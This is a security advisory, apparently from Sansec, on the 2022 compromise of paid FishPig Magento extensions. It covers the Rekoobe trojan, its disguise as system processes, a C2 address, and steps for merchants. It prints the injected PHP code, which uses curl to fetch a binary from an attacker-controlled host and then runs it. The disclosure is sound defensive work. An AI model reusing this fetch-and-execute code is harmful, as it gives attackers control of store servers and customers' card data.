What is
Magecart?

Also known as digital skimming, this crime has surged since 2015. Criminals steal
card data during online shopping. Who are behind these notorious hacks, how does it
work, and how have Magecart attacks evolved over time?
About Magecart
Fishpig, a vendor of popular Magento-Wordpress integrations, has been hacked.
Sansec found that attackers have injected malware in Fishpig software and taken
control of Fishpig servers. Online stores running Fishpig software may now have the
1/3

“Rekoobe” malware installed on their servers, effectively granting store
administrator access to attackers.
Update 2022-09-13 FishPig has confirmed the incident and published a status page. It
recommends customers to upgrade and/or reinstall all FishPig modules.

Sansec discovered malware in the Fishpig Magento Security Suite and several other
Fishpig extensions for Magento 2. It is likely that all paid Fishpig extensions have been
compromised. Free extensions that are hosted on Github seem not to be affected.
The injected malware will install another piece of malware (“Rekoobe”) which hides as
background process on the server.
The Fishpig distribution server was compromised on or before August 19th. Any Magento
store who installed or updated paid Fishpig software since then, is now likely running the
Rekoobe malware.
Fishpig software has over 200,000 downloads. It is not known how many stores use the
paid extensions.

Next steps for merchants
FishPig has stated that their repository is fully cleaned. Magento merchants are
recommended to:
1. Re-install all FishPig extensions per FishPig instructions
2. Run a server-side malware scanner to detect installed malware & unauthorized
activity. Use coupon FISHPIG to use our scanner one month for free.
3. Restart the server to terminate any unauthorized background processes

Attack details: lic.bin is Rekoobe
Attackers have added code to License.php , which is normally used to validate a Fishpig
license. When a Magento staff user visits the Fishpig control panel in the Magento backend,
the malware downloads a Linux binary from license.fishpig.co.uk . The name
lic.bin may make it look like a license asset, but it is actually the Rekoobe remote
access trojan.

$tmp = '/tmp/.varnish7684';
if (file_exists($tmp)) {
$fp = fopen($tmp, 'w');
if (!flock($fp, LOCK_EX | LOCK_NB)) {
return $this->adminDomain;
} else {
fclose($fp);
@system("cd ~/;curl https://license.fishpig.co.uk/image/dev/lic.png -o
lic.bin;chmod 777 lic.bin;./lic.bin '" . $this->adminDomain . "';rm lic.bin");
}
} else {
@system("cd ~/;curl https://license.fishpig.co.uk/image/dev/lic.png -o
lic.bin;chmod 777 lic.bin;./lic.bin '" . $this->adminDomain . "';rm lic.bin");
}

Rekoobe uses a configuration file called /tmp/.varnish7684 . After launching, it removes
all malware files and remains in memory. It hides as a system process and mimics one of
the following system services:
/usr/sbin/cron -f
/sbin/udevd -d
crond
auditd
/usr/sbin/rsyslogd
/usr/sbin/atd
/usr/sbin/acpid
dbus-daemon --system
/sbin/init
/usr/sbin/chronyd
/usr/libexec/postfix/master
/usr/lib/packagekit/packagekitd

Meanwhile, it waits for commands from the C2 server located at 46.183.217.223
(Latvia).
Sansec has not detected follow-up abuse via the C2 server yet. We expect that access to
the affected stores may be sold in bulk on hacking forums.

Acknowledgements
Sansec eComscan has been updated to detect the latest Rekoobe malware varieties.
Thanks to our partners Jetrails & Hypernode for their invaluable help in analyzing this
attack!
